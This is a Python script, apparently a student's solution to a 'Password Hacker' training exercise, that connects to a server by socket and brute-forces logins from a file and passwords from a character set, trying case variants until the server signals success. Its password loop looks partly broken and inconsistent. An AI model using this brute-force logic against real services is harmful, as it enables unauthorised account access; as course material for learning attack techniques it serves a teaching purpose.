import socket
import json
from cmdline import get_cmdline_args
from login_pwd_data import (ALL_ELEMENTS_STR,
                            verify_pwd_crack,
                            verify_login_crack,
                            gen_case_combos_for_word,
                            get_user_login_data,
                            )
from socket_conn import socket_operation


def check_creds(socket_conn: socket, creds_type: str, creds_data: list[str]) -> str | None:
    match creds_type:
        case "login":
            creds_to_send = {
                "login": "",
                "password": ""
            }
            for val in creds_data:
                if val.isalpha():
                    val_combos = gen_case_combos_for_word(val)
                    for val_combo in val_combos:
                        creds_to_send["login"] = val_combo
                        response = socket_operation(socket_connection=socket_conn,
                                                    msg_to_send=json.dumps(creds_to_send))
                        if verify_login_crack(msg=response):
                            return creds_to_send["login"]

                creds_to_send["login"] = val
                response = socket_operation(socket_connection=socket_conn,
                                            msg_to_send=json.dumps(creds_to_send))
                if verify_login_crack(msg=response):
                    return creds_to_send["login"]

        case "password":
            for val in creds_data:
                if val.isalpha():
                    val_combos = gen_case_combos_for_word(val)
                    for val_combo in val_combos:
                        response = socket_operation(socket_connection=socket_conn,
                                                    msg_to_send=val_combo)
                        if verify_login_crack(msg=response):
                            return val_combo

                response = socket_operation(socket_connection=socket_conn,
                                            msg_to_send=val)
                if verify_pwd_crack(msg=response):
                    return val


def main():
    inputs_cmdline = get_cmdline_args()
    server_data = (inputs_cmdline.ipaddress, inputs_cmdline.port)
    with socket.socket() as client_socket:
        client_socket.connect(server_data)
        cracked_login = check_creds(socket_conn=client_socket, creds_type="login", creds_data=logins)
        if cracked_login is not None:
            creds = {
                "login": cracked_login,
                "password": ""
            }
            cracked_pwd = check_creds(socket_conn=client_socket, creds_type="password", creds_data=passwords)

            if cracked_pwd is not None:
                return {
                    "login": cracked_login,
                    "password": cracked_pwd
                }


if __name__ == "__main__":
    # pwd_file = ("/Users/hello/Desktop/dev/tracks_hs/python_core/Password Hacker (Python)/Password Hacker ("
    #             "Python)/task/passwords.txt")
    # passwords = get_user_login_data(file_path=pwd_file)

    login_file = ("/Users/hello/Desktop/dev/tracks_hs/python_core/Password Hacker (Python)/Password Hacker ("
                  "Python)/task/logins.txt")
    passwords = ALL_ELEMENTS_STR
    logins = get_user_login_data(file_path=login_file)
    print(main())
